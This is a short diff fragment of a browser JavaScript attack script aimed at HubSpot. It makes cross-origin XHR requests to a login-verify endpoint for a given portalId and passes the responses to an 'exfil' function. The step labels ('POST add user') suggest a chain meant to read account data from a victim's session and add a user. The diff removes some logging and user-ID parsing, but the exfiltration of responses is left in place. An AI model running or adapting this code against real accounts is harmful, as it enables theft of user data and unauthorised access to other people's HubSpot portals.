@@ -56,7 +56,7 @@ console.log(portalId)
         return;
       }
 
-      // Step 2: POST add user
+      
       const xhr2 = new XMLHttpRequest();
       const postUrl = `https://app-eu1.hubspot.com/login-verify/hub-user-info?portalId=${portalId}`;
       xhr2.open("GET", postUrl, true);
@@ -66,23 +66,9 @@ console.log(portalId)
       
       xhr2.onreadystatechange = function () {
         if (xhr2.readyState === XMLHttpRequest.DONE) {
-          log("\n[+] Step 2 - POST add user response:");
           log(xhr2.responseText);
           exfil("step2-post-add-user", xhr2.responseText);
 
-          let userId = null;
-          try {
-            const resp = JSON.parse(xhr2.responseText);
-            userId = resp.id || (resp.user && resp.user.id) || (Array.isArray(resp) && resp[0] && resp[0].id);
-          } catch (e) {
-            log("[-] Failed to parse user ID from step 2.");
-            return;
-          }
-
-          if (!userId) {
-            log("[-] No user ID found in step 2 response.");
-            return;
-          }
 
           
           const xhr3 = new XMLHttpRequest();
